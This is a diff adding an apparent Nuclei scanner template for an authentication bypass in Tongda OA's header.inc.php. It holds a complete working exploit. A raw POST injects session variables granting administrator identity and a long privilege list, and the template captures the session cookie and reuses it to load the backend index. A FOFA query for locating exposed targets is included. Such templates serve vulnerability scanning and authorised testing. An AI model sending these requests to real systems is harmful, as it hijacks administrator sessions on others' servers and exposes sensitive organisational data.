@@ -1,0 +1,47 @@
+id: tongda-arbitrary-login
+
+info:
+  name: Tongda OA header.inc.php - Authentication Bypass
+  author: SleepingBag945
+  severity: high
+  description: |
+    Tongda OA is an OA system. The old version of header.inc.php has an authentication bypass vulnerability. An attacker can construct a malicious request to access header.inc.php, obtain the cookie, pass identity authentication, log in to the backend, perform related sensitive operations, and cause sensitive information leakage, etc.
+  reference:
+    - https://github.com/Phuong39/2022-HW-POC/blob/main/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87.md
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-2017-auth-bypass.yaml
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,authbypass,misconfig
+
+http:
+  - raw:
+      - |
+        POST /module/retrieve_pwd/header.inc.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        _SESSION[LOGIN_THEME]=15&_SESSION[LOGIN_USER_ID]=1&_SESSION[LOGIN_UID]=1&_SESSION[LOGIN_FUNC_STR]=1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,225,236,78,178,104,121,149,84,99,100,533,101,113,198,540,626,638,38,&_SESSION[LOGIN_USER_PRIV]=1&_SESSION[LOGIN_USER_PRIV_OTHER]=1&_SESSION[LOGIN_USER_PRIV_TYPE]=1&_SESSION[LOGIN_NOT_VIEW_USER]=0&_SESSION[RETRIEVE_PWD_USER]=1
+      - |
+        GET /general/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{cookie}};
+
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        group: 1
+        regex:
+          - 'PHPSESSID=(.*?);'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(header_1, "Set-Cookie") && contains(header_1,"PHPSESSID")'
+          - 'status_code_2 == 200 && !contains(body_2,"<title>用户未登录</title>")  && contains(body_2,"loginUser")'
+        condition: and
+
+# digest: 4b0a00483046022100827e905c51b81993182e9320b324168da41af4255a5315692103a365288573e4022100a1043e68a509de2024cd374221b84f560491dadd41449cc52fb6e38da8b82dbc:922c64590222798bb761d5b6d8e72950
